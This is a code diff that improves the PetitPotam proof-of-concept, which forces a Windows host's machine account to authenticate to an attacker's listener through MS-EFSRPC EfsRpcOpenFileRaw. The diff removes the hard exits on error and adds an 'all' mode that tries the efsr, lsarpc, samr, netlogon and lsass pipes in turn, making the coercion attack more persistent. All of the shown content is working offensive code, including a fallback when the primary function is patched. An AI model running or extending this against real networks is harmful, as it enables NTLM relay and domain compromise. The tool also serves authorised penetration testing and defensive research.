@@ -357,14 +357,16 @@ class CoerceAuth():
             dce.connect()
         except Exception as e:
             print("Something went wrong, check error status => %s" % str(e))  
-            sys.exit()
+            #sys.exit()
+            return
         print("[+] Connected!")
         print("[+] Binding to %s" % binding_params[pipe]['MSRPC_UUID_EFSR'][0])
         try:
             dce.bind(uuidtup_to_bin(binding_params[pipe]['MSRPC_UUID_EFSR']))
         except Exception as e:
             print("Something went wrong, check error status => %s" % str(e)) 
-            sys.exit()
+            #sys.exit()
+            return
         print("[+] Successfully bound!")
         return dce
         
@@ -381,7 +383,8 @@ class CoerceAuth():
             if str(e).find('ERROR_BAD_NETPATH') >= 0:
                 print('[+] Got expected ERROR_BAD_NETPATH exception!!')
                 print('[+] Attack worked!')
-                sys.exit()
+                #sys.exit()
+                return None
             if str(e).find('rpc_s_access_denied') >= 0:
                 print('[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!')
                 print('[+] OK! Using unpatched function!')
@@ -397,11 +400,13 @@ class CoerceAuth():
                         pass
                     else:
                         print("Something went wrong, check error status => %s" % str(e)) 
-                        sys.exit()
+                        return None
+                        #sys.exit()
                 
             else:
                 print("Something went wrong, check error status => %s" % str(e)) 
-                sys.exit()
+                return None
+                #sys.exit()
 
 def main():
     parser = argparse.ArgumentParser(add_help = True, description = "PetitPotam - rough PoC to connect to lsarpc and elicit machine account authentication via MS-EFSRPC EfsRpcOpenFileRaw()")
@@ -420,7 +425,7 @@ def main():
                         help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                         'This is useful when target is the NetBIOS name or Kerberos name and you cannot resolve it')
 
-    parser.add_argument('-pipe', action="store", choices=['efsr', 'lsarpc', 'samr', 'netlogon', 'lsass'], default='lsarpc', help='Named pipe to use (default: lsarpc)')
+    parser.add_argument('-pipe', action="store", choices=['efsr', 'lsarpc', 'samr', 'netlogon', 'lsass', 'all'], default='lsarpc', help='Named pipe to use (default: lsarpc) or all')
     parser.add_argument('listener', help='ip address or hostname of listener')
     parser.add_argument('target', help='ip address or hostname of target')
     options = parser.parse_args()
@@ -438,10 +443,18 @@ def main():
         options.password = getpass("Password:")
     
     plop = CoerceAuth()
-    dce = plop.connect(username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=options.target, pipe=options.pipe, doKerberos=options.k, dcHost=options.dc_ip, targetIp=options.target_ip)
-    plop.EfsRpcOpenFileRaw(dce, options.listener)
-
-    dce.disconnect()
+    
+    if options.pipe == "all":
+        all_pipes = ['efsr', 'lsarpc', 'samr', 'netlogon', 'lsass']
+    else:
+        all_pipes = [options.pipe]
+    
+    for all_pipe in all_pipes:
+        print("Trying pipe", all_pipe)
+        dce = plop.connect(username=options.username, password=options.password, domain=options.domain, lmhash=lmhash, nthash=nthash, target=options.target, pipe=all_pipe, doKerberos=options.k, dcHost=options.dc_ip, targetIp=options.target_ip)
+        if dce is not None:
+            plop.EfsRpcOpenFileRaw(dce, options.listener)
+            dce.disconnect()
     sys.exit()   
              
 if __name__ == '__main__':
